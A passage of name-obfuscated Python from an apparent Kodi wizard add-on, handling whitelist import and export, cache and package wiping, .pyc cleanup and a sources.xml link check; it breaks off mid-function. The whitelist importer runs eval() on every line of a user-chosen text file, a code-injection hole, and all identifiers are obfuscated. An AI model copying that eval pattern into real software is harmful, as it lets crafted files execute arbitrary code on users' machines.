        O000O0OOO00OO0OO0 =DIALOG .browse (1 ,'[COLOR %s]Select the whitelist file to import[/COLOR]'%COLOR2 ,'files','.txt',False ,False ,HOME )#line:3102
        log (str (O000O0OOO00OO0OO0 ))#line:3103
        if not O000O0OOO00OO0OO0 .endswith ('.txt'):#line:3104
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Cancelled![/COLOR]"%COLOR2 )#line:3105
            return #line:3106
        OOOO0OO0O0O0O000O =xbmcvfs .File (O000O0OOO00OO0OO0 )#line:3107
        O0O000OO0OO00O000 =OOOO0OO0O0O0O000O .read ()#line:3108
        OOOO0OO0O0O0O000O .close ()#line:3109
        OOO00O0OO00O0OOO0 =whiteList ('read');OO0000OOOOO00O00O =[];O0O0OO00OO00O0OOO =0 #line:3110
        for O0OO0O000O00O00O0 in OOO00O0OO00O0OOO0 :#line:3111
            OO0OO0O0000O00OO0 ,OO000OO00O0O0O000 ,O0O0OO0O0OOO0OO0O =O0OO0O000O00O00O0 #line:3112
            OO0000OOOOO00O00O .append (OO000OO00O0O0O000 )#line:3113
        O0000O0000O00O0O0 =O0O000OO0OO00O000 .split ('\n')#line:3114
        with open (WHITELIST ,'a')as OOOO0OO0O0O0O000O :#line:3115
            for O0OO0O000O00O00O0 in O0000O0000O00O0O0 :#line:3116
                try :#line:3117
                    OO0OO0O0000O00OO0 ,OO000OO00O0O0O000 ,OO0OO0O000OO0000O =eval (O0OO0O000O00O00O0 )#line:3118
                except Exception as OO000OOO0O0O0OO00 :#line:3119
                    log ("Error Adding: '%s' / %s"%(O0OO0O000O00O00O0 ,str (OO000OOO0O0O0OO00 )),5 )#line:3120
                    continue #line:3121
                log ("%s / %s / %s"%(OO0OO0O0000O00OO0 ,OO000OO00O0O0O000 ,OO0OO0O000OO0000O ),5 )#line:3122
                if not OO000OO00O0O0O000 in OO0000OOOOO00O00O :#line:3123
                    O0O0OO00OO00O0OOO +=1 #line:3124
                    O0O0OO0000000O00O ="['%s', '%s', '%s']"%(OO0OO0O0000O00OO0 ,OO000OO00O0O0O000 ,OO0OO0O000OO0000O )#line:3125
                    if len (OO0000OOOOO00O00O )+O0O0OO00OO00O0OOO >1 :O0O0OO0000000O00O ="\n%s"%O0O0OO0000000O00O #line:3126
                    OOOO0OO0O0O0O000O .write (O0O0OO0000000O00O )#line:3127
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Item(s) Added[/COLOR]"%(COLOR2 ,O0O0OO00OO00O0OOO ))#line:3128
    elif OO000000OO00OOO00 =='export':#line:3129
        O000O0OOO00OO0OO0 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the whitelist file[/COLOR]'%COLOR2 ,'files','.txt',False ,False ,HOME )#line:3130
        log (str (O000O0OOO00OO0OO0 ),5 )#line:3131
        try :#line:3132
            xbmcvfs .copy (WHITELIST ,os .path .join (O000O0OOO00OO0OO0 ,'whitelist.txt'))#line:3133
            DIALOG .ok (ADDONTITLE ,"[COLOR %s]Whitelist has been exported to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O000O0OOO00OO0OO0 ,'whitelist.txt')))#line:3134
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Whitelist Exported[/COLOR]"%(COLOR2 ))#line:3135
        except Exception as OO000OOO0O0O0OO00 :#line:3136
            log ("Export Error: %s"%str (OO000OOO0O0O0OO00 ),5 )#line:3137
            if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The location you selected isnt writable would you like to select another one?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Location[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:3138
                LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Whitelist Export Cancelled[/COLOR]"%(COLOR2 ,OO000OOO0O0O0OO00 ))#line:3139
            else :#line:3140
                O0O00OO000OOOO0O0 (export )#line:3141
    elif OO000000OO00OOO00 =='clear':#line:3142
        if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Are you sure you want to clear your whitelist?"%COLOR2 ,"This process can't be undone.[/COLOR]",yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:3143
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clear Whitelist Cancelled[/COLOR]"%(COLOR2 ))#line:3144
            return #line:3145
        try :#line:3146
            os .remove (WHITELIST )#line:3147
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Whitelist Cleared[/COLOR]"%(COLOR2 ))#line:3148
        except :#line:3149
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Error Clearing Whitelist![/COLOR]"%(COLOR2 ))#line:3150
def clearPackages (over =None ):#line:3152
    try :#line:3153
        CleanPYO ()#line:3154
    except :pass #line:3155
    if os .path .exists (PACKAGES ):#line:3156
        try :#line:3157
            for OO00O000O00O00OO0 ,OOO000O00O0O00000 ,O0OOOO0OOO000OOOO in os .walk (PACKAGES ):#line:3158
                O0OOOOO0OOOO000O0 =0 #line:3159
                O0OOOOO0OOOO000O0 +=len (O0OOOO0OOO000OOOO )#line:3160
                if O0OOOOO0OOOO000O0 >0 :#line:3161
                    OO00000OO00O0000O =convertSize (getSize (PACKAGES ))#line:3162
                    if over :O0O0O0O0OO00OOOOO =1 #line:3163
                    else :O0O0O0O0OO00OOOOO =1 #line:3164
                    if O0O0O0O0OO00OOOOO :#line:3165
                        for OOO00OO0O0O0O0O0O in O0OOOO0OOO000OOOO :os .unlink (os .path .join (OO00O000O00O00OO0 ,OOO00OO0O0O0O0O0O ))#line:3166
                        for OO0OOOOOO00OOO000 in OOO000O00O0O00000 :shutil .rmtree (os .path .join (OO00O000O00O00OO0 ,OO0OOOOOO00OOO000 ))#line:3167
        except Exception as O0OOO0000OO00O0O0 :#line:3170
            log ("Clear Packages Error: %s"%str (O0OOO0000OO00O0O0 ),5 )#line:3172
def clearPackagesStartup ():#line:3175
    O00000O0000OO0OO0 =datetime .utcnow ()-timedelta (minutes =3 )#line:3176
    OO0000O0O0OOOOO00 =0 ;OOOO0000OO00OOO0O =0 #line:3177
    if os .path .exists (PACKAGES ):#line:3178
        OO0O00OOO00O00OOO =os .listdir (PACKAGES )#line:3179
        OO0O00OOO00O00OOO .sort (key =lambda O0O0OOO0OO00OOO0O :os .path .getmtime (os .path .join (PACKAGES ,O0O0OOO0OO00OOO0O )))#line:3180
        try :#line:3181
            for O00OO0O0OO00OOO00 in OO0O00OOO00O00OOO :#line:3182
                OO0OOO0OOOOO0O0O0 =os .path .join (PACKAGES ,O00OO0O0OO00OOO00 )#line:3183
                OOOO0000OOOOO0OO0 =datetime .utcfromtimestamp (os .path .getmtime (OO0OOO0OOOOO0O0O0 ))#line:3184
                if OOOO0000OOOOO0OO0 <=O00000O0000OO0OO0 :#line:3185
                    if os .path .isfile (OO0OOO0OOOOO0O0O0 ):#line:3186
                        OO0000O0O0OOOOO00 +=1 #line:3187
                        OOOO0000OO00OOO0O +=os .path .getsize (OO0OOO0OOOOO0O0O0 )#line:3188
                        os .unlink (OO0OOO0OOOOO0O0O0 )#line:3189
                    elif os .path .isdir (OO0OOO0OOOOO0O0O0 ):#line:3190
                        OOOO0000OO00OOO0O +=getSize (OO0OOO0OOOOO0O0O0 )#line:3191
                        O0OOO000O0000000O ,O0OOOO0OOOOOOO0O0 =cleanHouse (OO0OOO0OOOOO0O0O0 )#line:3192
                        OO0000O0O0OOOOO00 +=O0OOO000O0000000O +O0OOOO0OOOOOOO0O0 #line:3193
                        try :#line:3194
                            shutil .rmtree (OO0OOO0OOOOO0O0O0 )#line:3195
                        except Exception as O00O0O000000OO0O0 :#line:3196
                            log ("Failed to remove %s: %s"%(OO0OOO0OOOOO0O0O0 ,str (O00O0O000000OO0O0 ),5 ))#line:3197
            if OO0000O0O0OOOOO00 >0 :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Success: %s[/COLOR]'%(COLOR2 ,convertSize (OOOO0000OO00OOO0O )))#line:3198
            else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: None Found![/COLOR]'%COLOR2 )#line:3199
        except Exception as O00O0O000000OO0O0 :#line:3200
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Error![/COLOR]'%COLOR2 )#line:3201
            log ("Clear Packages Error: %s"%str (O00O0O000000OO0O0 ),5 )#line:3202
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: None Found![/COLOR]'%COLOR2 )#line:3203
def clearCache (over =None ):#line:3205
    O0OOOO0O000OOO000 =os .path .join (PROFILE ,'addon_data')#line:3216
    OOOO00OO0O000O00O =[(os .path .join (ADDONDATA ,'plugin.video.HebDub.movies','database.db')),(os .path .join (ADDONDATA ,'plugin.video.bob','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.specto','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db')),(os .path .join (DATABASE ,'onechannelcache.db')),(os .path .join (DATABASE ,'saltscache.db')),(os .path .join (DATABASE ,'saltshd.lite.db'))]#line:3225
    O000000OOOO00OO0O =[(O0OOOO0O000OOO000 ),(ADDONDATA ),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'temp')),os .path .join (translatepath ('special://profile/addon_data/plugin.program.autocompletion/Google'),''),os .path .join (translatepath ('special://profile/addon_data/script.skin.helper.colorpicker/colors'),''),os .path .join (translatepath ('special://profile/addon_data/service.subtitles.All_Subs/temp_wizdom'),''),os .path .join (translatepath ('special://profile/addon_data/service.subtitles.All_Subs/temp'),''),os .path .join (translatepath ('special://profile/addon_data/script.colorbox'),''),os .path .join (translatepath ('special://profile/addon_data/script.module.metadatautils/animatedgifs'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/ArtistInformation'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/ArtistSlideshow'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/merge'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/temp'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/transition'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/resources'),''),os .path .join (translatepath ('special://profile/addon_data/plugin.video.movixws/logos'),''),os .path .join (translatepath ('special://profile/addon_data/service.subtitles.subscenter/temp'),''),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','Other')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','LocalAndRental')),(os .path .join (ADDONS ,'temp')),(os .path .join (O0OOOO0O000OOO000 ,'script.module.simple.downloader')),(os .path .join (O0OOOO0O000OOO000 ,'plugin.video.itv','Images'))]#line:3254
    OO0OO00OO00O0OO0O =0 #line:3255
    O0O00OO00OOO00OOO =['meta_cache','archive_cache']#line:3256
    for O00O000O00O0O000O in O000000OOOO00OO0O :#line:3257
        if os .path .exists (O00O000O00O0O000O )and not O00O000O00O0O000O in [ADDONDATA ,O0OOOO0O000OOO000 ]:#line:3258
            for OO0OOO00O0OO0O00O ,O0O0OO0OO0OOOO0O0 ,OOO0O000OOO0O0OO0 in os .walk (O00O000O00O0O000O ):#line:3259
                O0O0OO0OO0OOOO0O0 [:]=[OO0O000OOOO000OOO for OO0O000OOOO000OOO in O0O0OO0OO0OOOO0O0 if OO0O000OOOO000OOO not in O0O00OO00OOO00OOO ]#line:3260
                OOOOO0O0OO0OO0000 =0 #line:3261
                OOOOO0O0OO0OO0000 +=len (OOO0O000OOO0O0OO0 )#line:3262
                if OOOOO0O0OO0OO0000 >0 :#line:3263
                    for O00OO000OOO00OOO0 in OOO0O000OOO0O0OO0 :#line:3264
                        if not O00OO000OOO00OOO0 in LOGFILES :#line:3265
                            try :#line:3266
                                os .unlink (os .path .join (OO0OOO00O0OO0O00O ,O00OO000OOO00OOO0 ))#line:3267
                                log ("[Wiped] %s"%os .path .join (OO0OOO00O0OO0O00O ,O00OO000OOO00OOO0 ),5 )#line:3268
                                OO0OO00OO00O0OO0O +=1 #line:3269
                            except :#line:3270
                                pass #line:3271
                        else :log ('Ignore Log File: %s'%O00OO000OOO00OOO0 ,5 )#line:3272
                    for O0000O0OO000OO000 in O0O0OO0OO0OOOO0O0 :#line:3273
                        try :#line:3274
                            shutil .rmtree (os .path .join (OO0OOO00O0OO0O00O ,O0000O0OO000OO000 ))#line:3275
                            OO0OO00OO00O0OO0O +=1 #line:3276
                            log ("[Success] cleared %s files from %s"%(str (OOOOO0O0OO0OO0000 ),os .path .join (O00O000O00O0O000O ,O0000O0OO000OO000 )),5 )#line:3277
                        except :#line:3278
                            log ("[Failed] to wipe cache in: %s"%os .path .join (O00O000O00O0O000O ,O0000O0OO000OO000 ),5 )#line:3279
    if os .path .exists (PACKAGES ):#line:3291
        try :#line:3292
            for OO0OOO00O0OO0O00O ,O0O0OO0OO0OOOO0O0 ,OOO0O000OOO0O0OO0 in os .walk (PACKAGES ):#line:3293
                OOOOO0O0OO0OO0000 =0 #line:3294
                OOOOO0O0OO0OO0000 +=len (OOO0O000OOO0O0OO0 )#line:3295
                if OOOOO0O0OO0OO0000 >0 :#line:3296
                    O00OO00OO000OOOO0 =convertSize (getSize (PACKAGES ))#line:3297
                    if over :OO0O0OO00OOOO000O =1 #line:3298
                    else :OO0O0OO00OOOO000O =1 #line:3299
                    if OO0O0OO00OOOO000O :#line:3300
                        for O00OO000OOO00OOO0 in OOO0O000OOO0O0OO0 :os .unlink (os .path .join (OO0OOO00O0OO0O00O ,O00OO000OOO00OOO0 ))#line:3301
                        for O0000O0OO000OO000 in O0O0OO0OO0OOOO0O0 :shutil .rmtree (os .path .join (OO0OOO00O0OO0O00O ,O0000O0OO000OO000 ))#line:3302
        except Exception as OOOOOOO000O00O00O :#line:3305
            log ("Clear Packages Error: %s"%str (OOOOOOO000O00O00O ),5 )#line:3307
    if INCLUDEVIDEO =='true'and over ==None :#line:3309
        OOO0O000OOO0O0OO0 =[]#line:3310
        if INCLUDEALL =='true':OOO0O000OOO0O0OO0 =OOOO00OO0O000O00O #line:3311
        else :#line:3312
            if INCLUDEBOB =='true':OOO0O000OOO0O0OO0 .append (os .path .join (ADDONDATA ,'plugin.video.bob','cache.db'))#line:3313
            if INCLUDEPHOENIX =='true':OOO0O000OOO0O0OO0 .append (os .path .join (ADDONDATA ,'plugin.video.HebDub.movies','database.db'))#line:3314
            if INCLUDESPECTO =='true':OOO0O000OOO0O0OO0 .append (os .path .join (ADDONDATA ,'plugin.video.specto','cache.db'))#line:3315
            if INCLUDEGENESIS =='true':OOO0O000OOO0O0OO0 .append (os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db'))#line:3316
            if INCLUDEEXODUS =='true':OOO0O000OOO0O0OO0 .append (os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db'))#line:3317
            if INCLUDEONECHAN =='true':OOO0O000OOO0O0OO0 .append (os .path .join (DATABASE ,'onechannelcache.db'))#line:3318
            if INCLUDESALTS =='true':OOO0O000OOO0O0OO0 .append (os .path .join (DATABASE ,'saltscache.db'))#line:3319
            if INCLUDESALTSHD =='true':OOO0O000OOO0O0OO0 .append (os .path .join (DATABASE ,'saltshd.lite.db'))#line:3320
        if len (OOO0O000OOO0O0OO0 )>0 :#line:3321
            for O00O000O00O0O000O in OOO0O000OOO0O0OO0 :#line:3322
                if os .path .exists (O00O000O00O0O000O ):#line:3323
                    OO0OO00OO00O0OO0O +=1 #line:3324
                    try :#line:3325
                        OOOOO0O00O00O0OOO =database .connect (O00O000O00O0O000O )#line:3326
                        OOO00O0OOOO0O0000 =OOOOO0O00O00O0OOO .cursor ()#line:3327
                    except Exception as OOOOOOO000O00O00O :#line:3328
                        log ("DB Connection error: %s"%str (OOOOOOO000O00O00O ),5 )#line:3329
                        continue #line:3330
                    if 'Database'in O00O000O00O0O000O :#line:3331
                        try :#line:3332
                            OOO00O0OOOO0O0000 .execute ("DELETE FROM url_cache")#line:3333
                            OOO00O0OOOO0O0000 .execute ("VACUUM")#line:3334
                            OOOOO0O00O00O0OOO .commit ()#line:3335
                            OOO00O0OOOO0O0000 .close ()#line:3336
                            log ("[Success] wiped %s"%O00O000O00O0O000O ,5 )#line:3337
                        except Exception as OOOOOOO000O00O00O :#line:3338
                            log ("[Failed] wiped %s: %s"%(O00O000O00O0O000O ,str (OOOOOOO000O00O00O )),5 )#line:3339
                    else :#line:3340
                        OOO00O0OOOO0O0000 .execute ("SELECT name FROM sqlite_master WHERE type = 'table'")#line:3341
                        for OO0O0O00OO0OOO00O in OOO00O0OOOO0O0000 .fetchall ():#line:3342
                            try :#line:3343
                                OOO00O0OOOO0O0000 .execute ("DELETE FROM %s"%OO0O0O00OO0OOO00O [0 ])#line:3344
                                OOO00O0OOOO0O0000 .execute ("VACUUM")#line:3345
                                OOOOO0O00O00O0OOO .commit ()#line:3346
                                log ("[Success] wiped %s in %s"%(OO0O0O00OO0OOO00O ,O00O000O00O0O000O ),5 )#line:3347
                            except Exception as OOOOOOO000O00O00O :#line:3348
                                log ("[Failed] wiped %s in %s: %s"%(OO0O0O00OO0OOO00O ,O00O000O00O0O000O ,str (OOOOOOO000O00O00O )),5 )#line:3349
                        OOO00O0OOOO0O0000 .close ()#line:3350
        else :log ("Clear Cache: Clear Video Cache Not Enabled",5 )#line:3351
def clearCache3 ():#line:3354
    O0OO000OO000OOO00 =os .path .join (PROFILE ,'addon_data')#line:3356
    O00O0OOO0OO0OO0OO =[(O0OO000OO000OOO00 ),(ADDONDATA ),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'temp')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','Other')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','LocalAndRental')),(os .path .join (ADDONDATA ,'plugin.video.bob','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.bob.unleashed','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.specto','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.covenant','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.elementum','app.db-wal')),(os .path .join (ADDONDATA ,'plugin.video.itv','Images')),(os .path .join (DATABASE ,'onechannelcache.db')),(os .path .join (DATABASE ,'saltscache.db')),(os .path .join (DATABASE ,'saltshd.lite.db')),(os .path .join (O0OO000OO000OOO00 ,'script.module.simple.downloader')),(os .path .join (O0OO000OO000OOO00 ,'plugin.video.itv','Images'))]#line:3376
    OO0O0OO0OO0O0O00O =0 #line:3378
    for O0OO00OOO0OOO0000 in O00O0OOO0OO0OO0OO :#line:3380
        if os .path .exists (O0OO00OOO0OOO0000 )and not O0OO00OOO0OOO0000 in [ADDONDATA ,O0OO000OO000OOO00 ]:#line:3381
            for O0O00OOO0O0O00000 ,OOOOO0O0OO0000O0O ,OOOO0OOOOOO0O0OO0 in os .walk (O0OO00OOO0OOO0000 ):#line:3382
                OO0O000OO0OO00000 =0 #line:3383
                OO0O000OO0OO00000 +=len (OOOO0OOOOOO0O0OO0 )#line:3384
                if OO0O000OO0OO00000 >0 :#line:3385
                    for OOOO0OO0000OO0OOO in OOOO0OOOOOO0O0OO0 :#line:3386
                        if not OOOO0OO0000OO0OOO in ['kodi.log','tvmc.log','spmc.log','xbmc.log']:#line:3387
                            try :#line:3388
                                os .unlink (os .path .join (O0O00OOO0O0O00000 ,OOOO0OO0000OO0OOO ))#line:3389
                            except :#line:3390
                                pass #line:3391
                        else :log ('Ignore Log File: %s'%OOOO0OO0000OO0OOO )#line:3392
                    for O000000O0O0OOOO00 in OOOOO0O0OO0000O0O :#line:3393
                        try :#line:3394
                            shutil .rmtree (os .path .join (O0O00OOO0O0O00000 ,O000000O0O0OOOO00 ))#line:3395
                            OO0O0OO0OO0O0O00O +=1 #line:3396
                            log ("[COLOR red][Success]  %s Files Removed From %s [/COLOR]"%(str (OO0O000OO0OO00000 ),os .path .join (O0OO00OOO0OOO0000 ,O000000O0O0OOOO00 )))#line:3397
                        except :#line:3398
                            log ("[COLOR red][Failed] To Wipe Cache In: %s [/COLOR]"%os .path .join (O0OO00OOO0OOO0000 ,O000000O0O0OOOO00 ))#line:3399
        else :#line:3400
            for O0O00OOO0O0O00000 ,OOOOO0O0OO0000O0O ,OOOO0OOOOOO0O0OO0 in os .walk (O0OO00OOO0OOO0000 ):#line:3401
                for O000000O0O0OOOO00 in OOOOO0O0OO0000O0O :#line:3402
                    if 'cache'in O000000O0O0OOOO00 .lower ():#line:3403
                        try :#line:3404
                            shutil .rmtree (os .path .join (O0O00OOO0O0O00000 ,O000000O0O0OOOO00 ))#line:3405
                            OO0O0OO0OO0O0O00O +=1 #line:3406
                            log ("[COLOR white][Success] Wiped %s [/COLOR]"%os .path .join (O0OO00OOO0OOO0000 ,O000000O0O0OOOO00 ))#line:3407
                        except :#line:3408
                            log ("[COLOR red][Failed] To Wipe Cache In: %s [/COLOR]"%os .path .join (O0OO00OOO0OOO0000 ,O000000O0O0OOOO00 ))#line:3409
    LogNotify (ADDONTITLE ,'[COLOR white]Cache:[/COLOR] [COLOR red] %s Items Removed[/COLOR]'%OO0O0OO0OO0O0O00O )#line:3411
origfolder =(translatepath ("special://home/addons"))#line:3412
def CleanPYO ():#line:3413
    OO0O0O00OOOO0O00O =0 #line:3414
    for (O0O0O00000OOO00O0 ,OOOOO000O00O0O0O0 ,OOO0OO0O00O00O000 )in os .walk (origfolder ):#line:3415
       for O0OO000O0O0O0OO0O in OOO0OO0O00O00O000 :#line:3416
          if O0OO000O0O0O0OO0O .endswith ('.pyo'):#line:3417
               os .remove (os .path .join (O0O0O00000OOO00O0 ,O0OO000O0O0O0OO0O ))#line:3419
          if O0OO000O0O0O0OO0O .endswith ('.pyc'):#line:3420
               os .remove (os .path .join (O0O0O00000OOO00O0 ,O0OO000O0O0O0OO0O ))#line:3422
def fixwizard (over =None ):#line:3423
    OO0O0000OO00000O0 =os .path .join (PROFILE ,'addon_data')#line:3425
    OO0O0OOOOO00OO0O0 =[(OO0O0000OO00000O0 ),(ADDONDATA ),os .path .join (translatepath ('special://profile/addon_data/plugin.program.Anonymous'),'')]#line:3430
    OOO000OOOOOO00000 =0 #line:3431
    OO0O0O00OOO0OOOOO =['meta_cache','archive_cache']#line:3432
    for OOOO0O0O00OOOO0O0 in OO0O0OOOOO00OO0O0 :#line:3433
        if os .path .exists (OOOO0O0O00OOOO0O0 )and not OOOO0O0O00OOOO0O0 in [ADDONDATA ,OO0O0000OO00000O0 ]:#line:3434
            for O00O00O0OO000O000 ,O0OOO00000OOOOOOO ,OO0OO0O000OOOO000 in os .walk (OOOO0O0O00OOOO0O0 ):#line:3435
                O0OOO00000OOOOOOO [:]=[OOO0OOO000000OO0O for OOO0OOO000000OO0O in O0OOO00000OOOOOOO if OOO0OOO000000OO0O not in OO0O0O00OOO0OOOOO ]#line:3436
                OOO000O00OO000OOO =0 #line:3437
                OOO000O00OO000OOO +=len (OO0OO0O000OOOO000 )#line:3438
                if OOO000O00OO000OOO >0 :#line:3439
                    for O0000O0000OOOOOOO in OO0OO0O000OOOO000 :#line:3440
                        if not O0000O0000OOOOOOO in LOGFILES :#line:3441
                            try :#line:3442
                                os .unlink (os .path .join (O00O00O0OO000O000 ,O0000O0000OOOOOOO ))#line:3443
                                log ("[Wiped] %s"%os .path .join (O00O00O0OO000O000 ,O0000O0000OOOOOOO ),5 )#line:3444
                                OOO000OOOOOO00000 +=1 #line:3445
                            except :#line:3446
                                pass #line:3447
                        else :log ('Ignore Log File: %s'%O0000O0000OOOOOOO ,5 )#line:3448
                    for O000OOO00O000O0O0 in O0OOO00000OOOOOOO :#line:3449
                        try :#line:3450
                            shutil .rmtree (os .path .join (O00O00O0OO000O000 ,O000OOO00O000O0O0 ))#line:3451
                            OOO000OOOOOO00000 +=1 #line:3452
                            log ("[Success] cleared %s files from %s"%(str (OOO000O00OO000OOO ),os .path .join (OOOO0O0O00OOOO0O0 ,O000OOO00O000O0O0 )),5 )#line:3453
                        except :#line:3454
                            log ("[Failed] to wipe cache in: %s"%os .path .join (OOOO0O0O00OOOO0O0 ,O000OOO00O000O0O0 ),5 )#line:3455
        else :#line:3456
            for O00O00O0OO000O000 ,O0OOO00000OOOOOOO ,OO0OO0O000OOOO000 in os .walk (OOOO0O0O00OOOO0O0 ):#line:3457
                O0OOO00000OOOOOOO [:]=[O0000O000OO0O0OO0 for O0000O000OO0O0OO0 in O0OOO00000OOOOOOO if O0000O000OO0O0OO0 not in OO0O0O00OOO0OOOOO ]#line:3458
                for O000OOO00O000O0O0 in O0OOO00000OOOOOOO :#line:3459
                    if not str (O000OOO00O000O0O0 .lower ()).find ('cache')==-1 :#line:3460
                        try :#line:3461
                            shutil .rmtree (os .path .join (O00O00O0OO000O000 ,O000OOO00O000O0O0 ))#line:3462
                            OOO000OOOOOO00000 +=1 #line:3463
                            log ("[Success] wiped %s "%os .path .join (O00O00O0OO000O000 ,O000OOO00O000O0O0 ),5 )#line:3464
                        except :#line:3465
                            log ("[Failed] to wipe cache in: %s"%os .path .join (OOOO0O0O00OOOO0O0 ,O000OOO00O000O0O0 ),5 )#line:3466
    if os .path .exists (PACKAGES ):#line:3467
        try :#line:3468
            for O00O00O0OO000O000 ,O0OOO00000OOOOOOO ,OO0OO0O000OOOO000 in os .walk (PACKAGES ):#line:3469
                OOO000O00OO000OOO =0 #line:3470
                OOO000O00OO000OOO +=len (OO0OO0O000OOOO000 )#line:3471
                if OOO000O00OO000OOO >0 :#line:3472
                    O0000OOO00000OOO0 =convertSize (getSize (PACKAGES ))#line:3473
                    if over :O00OOO0000O00000O =1 #line:3474
                    else :O00OOO0000O00000O =1 #line:3475
                    if O00OOO0000O00000O :#line:3476
                        for O0000O0000OOOOOOO in OO0OO0O000OOOO000 :os .unlink (os .path .join (O00O00O0OO000O000 ,O0000O0000OOOOOOO ))#line:3477
                        for O000OOO00O000O0O0 in O0OOO00000OOOOOOO :shutil .rmtree (os .path .join (O00O00O0OO000O000 ,O000OOO00O000O0O0 ))#line:3478
                        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Success![/COLOR]'%COLOR2 )#line:3479
        except Exception as O00OO0OO0000OO00O :#line:3481
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Error![/COLOR]'%COLOR2 )#line:3482
            log ("Clear Packages Error: %s"%str (O00OO0OO0000OO00O ),5 )#line:3483
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: None Found![/COLOR]'%COLOR2 )#line:3484
    LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]איפוס עבר בהצלחה %s Files[/COLOR]'%(COLOR2 ,OOO000OOOOOO00000 ))#line:3486
def checkSources ():#line:3488
    if not os .path .exists (SOURCES ):#line:3489
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Sources.xml File Found![/COLOR]"%COLOR2 )#line:3490
        return False #line:3491
    O00O00O0O000OOOOO =0 #line:3492
    O00OOO000OO00O000 =[]#line:3493
    OOOOOO00O00O0000O =[]#line:3494
    O0OO0000000O000OO =open (SOURCES )#line:3495
    O0O00O0000OOO0O0O =O0OO0000000O000OO .read ()#line:3496
    OOOO00OOO0O000O00 =O0O00O0000OOO0O0O .replace ('\r','').replace ('\n','').replace ('\t','')#line:3497
    OOO00000OO00OOO0O =re .compile ('<files>.+?</files>').findall (OOOO00OOO0O000O00 )#line:3498
    O0OO0000000O000OO .close ()#line:3499
    if len (OOO00000OO00OOO0O )>0 :#line:3500
        O000000OO00OOOOOO =re .compile ('<source>.+?<name>(.+?)</name>.+?<path pathversion="1">(.+?)</path>.+?<allowsharing>(.+?)</allowsharing>.+?</source>').findall (OOO00000OO00OOO0O [0 ])#line:3501
        DP .create (ADDONTITLE ,"[COLOR %s]Scanning Sources for Broken links[/COLOR]"%COLOR2 )#line:3502
        for OOOO0OO00OO0OOO00 ,O0OOO0OO0000OO00O ,OO0O00OO0000OOOO0 in O000000OO00OOOOOO :#line:3503
            O00O00O0O000OOOOO +=1 #line:3504
            OO0O0OO000000OO00 =int (percentage (O00O00O0O000OOOOO ,len (O000000OO00OOOOOO )))#line:3505
            DP .update (OO0O0OO000000OO00 ,'',"[COLOR %s]Checking [COLOR %s]%s[/COLOR]:[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO0OO00OO0OOO00 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO0OO0000OO00O ))#line:3506
            if 'http'in O0OOO0OO0000OO00O :#line:3507
                OO00O00O0OO000O0O =workingURL (O0OOO0OO0000OO00O )#line:3508
                if not OO00O00O0OO000O0O ==True :#line:3509
